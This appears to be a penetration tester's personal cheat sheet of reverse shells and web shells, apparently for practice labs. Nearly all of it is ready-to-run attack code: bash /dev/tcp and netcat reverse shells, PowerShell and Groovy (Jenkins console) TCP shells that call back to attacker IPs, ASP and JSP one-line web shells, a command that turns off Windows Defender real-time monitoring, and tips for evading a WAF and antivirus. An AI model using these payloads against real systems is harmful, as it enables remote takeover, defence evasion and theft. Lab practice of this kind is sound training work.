! Use 443 port to evade WAF.
#shell

#### Generator
https://www.revshells.com/
#### Powershell generator
Encrypted & Passes AV
https://github.com/Adkali/PowerJoker
```bash
git clone https://github.com/Adkali/PowerJoker && cd Powerjoker
python3 PowerJoker.py -l 10.10.16.84 -p 1337
```
#### Basic bash shell
```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.117/4444 0>&1'

echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64

echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
```
##### Upgrade shell to fully interactive:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty size;stty raw -echo;fg
#export SHELL=bash
#stty rows $x columns $y #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```
or
```bash
script /dev/null bash
```
Good shell
```
rlwrap nc -lvnp
```
#### [[metasploit]]

#### Cheatsheet
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

#### PHP
#php
```bash
curl https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_sell.php > rsh.php
```

##### Java:
#java
https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/

##### ASP:
#asp
```asp
<% eval request("cmd") %>
```

##### JSP:
[[jsp]] #java
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

##### Groovy (jenkins console /script):
[[groovy]]
```Groovy
String host="10.10.15.232";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### Socat port forwarding:
[[port forwarding]]
[[socat]] #bash #shell
Download:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

from 8080 to 8888:
`./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080

ssh port forwarding:
```shell-session
root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
```

bash shells:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

powershell (run from cmd.exe):
[[powershell]]
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Windows
Disable AV to allow running shell from admin's powershell:
```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```



!